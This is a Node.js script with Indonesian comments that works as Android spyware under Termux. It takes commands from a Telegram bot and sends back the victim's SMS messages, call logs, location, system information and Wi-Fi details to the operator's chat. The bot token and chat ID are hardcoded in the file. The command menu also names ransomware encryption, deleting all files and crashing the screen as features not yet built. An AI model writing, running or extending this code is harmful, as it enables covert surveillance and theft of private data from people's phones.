const axios = require('axios');
const { exec } = require('child_process');

// Token Bot Telegram
const TOKEN = "7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0";
const ID_TELE = "5951232585";
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TOKEN}`;

// Fungsi untuk mengirim pesan
const kirimPesan = async (pesan) => {
  try {
    await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
      chat_id: ID_TELE,
      text: pesan,
    });
  } catch (error) {
    console.error("Error mengirim pesan:", error.message);
  }
};

// Fungsi untuk menjalankan perintah Termux
const jalankanPerintah = (command, callback) => {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error menjalankan perintah: ${error.message}`);
      callback(stderr || "Error menjalankan perintah.");
    } else {
      callback(stdout.trim());
    }
  });
};

// Fungsi utama untuk menangani perintah pengguna
const tanganiPerintah = async (perintah) => {
  switch (perintah) {
    case "Cek Status Baterai":
      jalankanPerintah("termux-battery-status", kirimPesan);
      break;
    case "Lokasi":
      jalankanPerintah("termux-location", kirimPesan);
      break;
    case "Informasi System":
      jalankanPerintah("termux-info", kirimPesan);
      break;
    case "Dump Sms":
      jalankanPerintah("termux-sms-list", kirimPesan);
      break;
    case "Dump Panggilan":
      jalankanPerintah("termux-call-log", kirimPesan);
      break;
    case "Ubah Wallpaper":
      kirimPesan("Fitur Ubah Wallpaper belum diimplementasikan.");
      break;
    case "Pesan Teks":
      kirimPesan("Fitur Pesan Teks belum diimplementasikan.");
      break;
    case "Pesan Audio":
      kirimPesan("Fitur Pesan Audio belum diimplementasikan.");
      break;
    case "Mati/Hidup Wifi":
      kirimPesan("Fitur Mati/Hidup Wifi belum diimplementasikan.");
      break;
    case "Getar Devices":
      jalankanPerintah("termux-vibrate", kirimPesan);
      break;
    case "Dapatkan Informasi Wifi":
      jalankanPerintah("termux-wifi-connectioninfo", kirimPesan);
      break;
    case "Senter On/Off":
      kirimPesan("Fitur Senter On/Off belum diimplementasikan.");
      break;
    case "Spam Notifikasi":
      kirimPesan("Fitur Spam Notifikasi belum diimplementasikan.");
      break;
    case "Ambil List Kotak Target":
      jalankanPerintah("termux-sms-list", kirimPesan);
      break;
    case "Play Audio":
      kirimPesan("Fitur Play Audio belum diimplementasikan.");
      break;
    case "Spam File":
      kirimPesan("Fitur Spam File belum diimplementasikan.");
      break;
    case "Encrypt Ransom":
      kirimPesan("Fitur Encrypt Ransom belum diimplementasikan.");
      break;
    case "Decrypt Ransom":
      kirimPesan("Fitur Decrypt Ransom belum diimplementasikan.");
      break;
    case "Layar Crash":
      kirimPesan("Fitur Layar Crash belum diimplementasikan.");
      break;
    case "Galery eyes":
      kirimPesan("Fitur Galery eyes belum diimplementasikan.");
      break;
    case "Remove All File":
      kirimPesan("Fitur Remove All File belum diimplementasikan.");
      break;
    case "Reset Semua Perintah":
      kirimPesan("Keyboard reset berhasil.");
      break;
    default:
      kirimPesan(`Perintah tidak dikenal: ${perintah}`);
      break;
  }
};

// Fungsi untuk mendapatkan update dari Telegram
const dapatkanUpdate = async () => {
  try {
    const response = await axios.get(`${TELEGRAM_API_URL}/getUpdates`);
    const updates = response.data.result;

    if (updates && updates.length > 0) {
      for (const update of updates) {
        if (update.message && update.message.text) {
          await tanganiPerintah(update.message.text);
        }
      }
    }
  } catch (error) {
    console.error("Error mendapatkan update:", error.message);
  }
};

// Loop utama untuk menjalankan bot
const main = async () => {
  while (true) {
    await dapatkanUpdate();
    await new Promise((resolve) => setTimeout(resolve, 20000));
  }
};

main();
